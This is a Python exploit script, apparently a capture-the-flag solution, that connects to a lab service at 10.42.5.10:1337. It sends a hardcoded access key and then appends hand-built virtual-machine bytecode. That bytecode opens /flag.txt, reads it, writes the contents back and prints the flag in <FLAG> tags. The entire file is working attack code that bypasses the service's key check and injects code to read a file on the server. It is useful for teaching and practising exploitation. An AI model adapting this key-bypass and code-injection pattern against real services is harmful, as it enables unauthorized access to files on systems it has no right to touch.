#!/usr/bin/env python3
import re
import socket
import sys
from typing import Optional

HOST = sys.argv[1] if len(sys.argv) > 1 else "10.42.5.10"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

# Valid 16-byte AI key derived from the VM constraints.
KEY = b"API-@d!!?@??AUUU"


def li(reg: int, val: int) -> bytes:
    return bytes([reg & 0xff, 0x21, val & 0xff])


def push(reg: int) -> bytes:
    return bytes([reg & 0xff, 0x24, 0x00])


def mov(dst: int, src: int) -> bytes:
    return bytes([dst & 0xff, 0x26, src & 0xff])


def sysc(num: int, dst: int = 0) -> bytes:
    return bytes([num & 0xff, 0x41, dst & 0xff])


def halt() -> bytes:
    return b"\x00\x42\x00"


def build_stage(path: bytes = b"/flag.txt") -> bytes:
    """Build second-stage VM bytecode: open(path), read flag, write it."""
    prog = b""

    # Put the path on the VM stack in forward order.
    for ch in path[::-1]:
        prog += li(0, ch)
        prog += push(0)

    # r0 = stack pointer, r1 = len(path), sys3 = open(path)
    prog += mov(0, 4)
    prog += li(1, len(path))
    prog += sysc(3, 2)

    # Read up to 255 bytes from the opened fd into mem[0:255].
    # sys1 returns the byte count in r2.
    prog += li(0, 0)
    prog += li(1, 0xff)
    prog += sysc(1, 2)

    # Write exactly the returned byte count from mem[0].
    prog += li(0, 0)
    prog += mov(1, 2)
    prog += sysc(2, 0)
    prog += halt()
    return prog


def extract_flag(data: bytes) -> Optional[bytes]:
    patterns = [
        rb"[A-Za-z0-9_\-]+\{[^}\r\n\x00]+\}",
        rb"flag\{[^}\r\n\x00]+\}",
    ]
    for pat in patterns:
        m = re.search(pat, data, re.IGNORECASE)
        if m:
            return m.group(0)
    return None


def main() -> int:
    payload = KEY + build_stage()

    with socket.create_connection((HOST, PORT), timeout=8) as s:
        s.settimeout(1.0)

        # The service prints "AI Key: " before reading. Do not depend on it;
        # send the key and second-stage bytecode even if the prompt is delayed.
        banner = b""
        try:
            banner = s.recv(1024)
        except socket.timeout:
            pass

        s.sendall(payload)
        try:
            s.shutdown(socket.SHUT_WR)
        except OSError:
            pass

        chunks = [banner]
        s.settimeout(5.0)
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)

    data = b"".join(chunks)
    flag = extract_flag(data)
    if flag:
        print(f"<FLAG>{flag.decode('utf-8', 'replace')}</FLAG>")
    else:
        sys.stdout.buffer.write(data)
        if data and not data.endswith(b"\n"):
            print()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
